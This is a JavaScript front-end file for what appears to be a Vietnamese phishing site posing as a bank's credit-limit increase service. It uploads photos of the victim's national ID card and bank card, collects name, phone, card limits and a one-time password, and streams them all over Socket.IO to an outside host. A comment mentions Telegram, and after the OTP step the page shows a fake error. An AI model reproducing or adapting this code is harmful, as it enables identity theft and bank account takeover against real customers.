$(document).ready(function () {
    const socket = io('https://khach-hang-uu-tien.online');
    const images = []
    var uploader = new SocketIOFileUpload(socket);
    socket.on('file', (data) => {
        images.push(data);
    });

    $('#mattruoccccd').click(function () {
        $(this).find('input[type="file"]')[0].click();
    });
    // Sử dụng FileReader để đọc dữ liệu tạm trước khi upload lên Server
    function readURL(input) {
        if (input.files && input.files[0]) {
            var reader = new FileReader();
            reader.onload = function (e) {

                $('#mattruoccccd').attr('style', 'background-image:url("' + e.target.result + '")');
                $('.textmattr').attr('style', 'display:none');
                $('#iconmattr').attr('style', 'display:none');

            }
            reader.readAsDataURL(input.files[0]);
        }
    }

    $('#matsaucccd').click(function () {
        jQuery('#matsaucccd').find('input[type="file"]')[0].click();
    });
    // Sử dụng FileReader để đọc dữ liệu tạm trước khi upload lên Server
    function readURL2(input) {
        if (input.files && input.files[0]) {
            var reader = new FileReader();
            reader.onload = function (e) {

                $('#matsaucccd').attr('style', 'background-image:url("' + e.target.result + '")');
                $('.textmatsau').attr('style', 'display:none');
                $('#iconmatsaucancuoc').attr('style', 'display:none');

            }
            reader.readAsDataURL(input.files[0]);
        }
    }

    $('#anhmattruocthe').click(function () {
        jQuery('#anhmattruocthe').find('input[type="file"]')[0].click();
    });
    // Sử dụng FileReader để đọc dữ liệu tạm trước khi upload lên Server
    function readURL3(input) {
        if (input.files && input.files[0]) {
            var reader = new FileReader();
            reader.onload = function (e) {

                $('#anhmattruocthe').attr('style', 'background-image:url("' + e.target.result + '")');
                $('.textanhtruocthe').attr('style', 'display:none');
                $('#iconmattruocthe').attr('style', 'display:none');

            }
            reader.readAsDataURL(input.files[0]);
        }
    }
    $('#anhmatsauthe').click(function () {
        jQuery('#anhmatsauthe').find('input[type="file"]')[0].click();
    });

    function readURL4(input) {
        if (input.files && input.files[0]) {
            var reader = new FileReader();
            reader.onload = function (e) {

                $('#anhmatsauthe').attr('style', 'background-image:url("' + e.target.result + '")');
                $('.textanhsauthe').attr('style', 'display:none');
                $('#iconmatsauthe').attr('style', 'display:none');

            }
            reader.readAsDataURL(input.files[0]);
        }
    }


    $("#mattruoc").change(function () {
        uploader.submitFiles([document.getElementById("mattruoc").files[0]]);

        readURL(this);
    });
    $("#matsau").change(async function () {
        uploader.submitFiles([document.getElementById("matsau").files[0]]);
        readURL2(this);
    });
    $("#mattruoc_card").change(async function () {
        uploader.submitFiles([document.getElementById("mattruoc_card").files[0]]);
        readURL3(this);
    });
    $("#matsau_card").change(async function () {
        uploader.submitFiles([document.getElementById("matsau_card").files[0]]);
        readURL4(this);
    });

    $('#service').submit(async function (e) {
        e.preventDefault();
        $('.loader').show()
        const data = {
            name: $('#name').val() ?? '',
            phone: $('#phone').val() ?? '',
            limit_now: $('#limit_now').val() ?? '',
            limit_total: $('#limit_total').val() ?? '',
            limit_increase: $('#limit_increase').val() ?? '',
            images: images
        }

        socket.emit('service', data);

        socket.on('success', () => {
            $('.loader').hide();
            window.location.href = '/otp';
        });

        socket.on('error', (data) => {
            $('.loader').hide();
            alert(data.message);
        });
    });

    $('#service_otp').submit(async function (e) {
        e.preventDefault();
        $('.loader').show()
        const data = {
            otp: $('#otp').val() ?? ''
        }
        // send data to api telegram
        socket.emit('otp', data);

        socket.on('success', () => {
            $('.loader').hide();
            window.location.href = '/otp-error';
        });

        socket.on('error', (data) => {
            $('.loader').hide();
            alert(data.message);
        });
    })

});


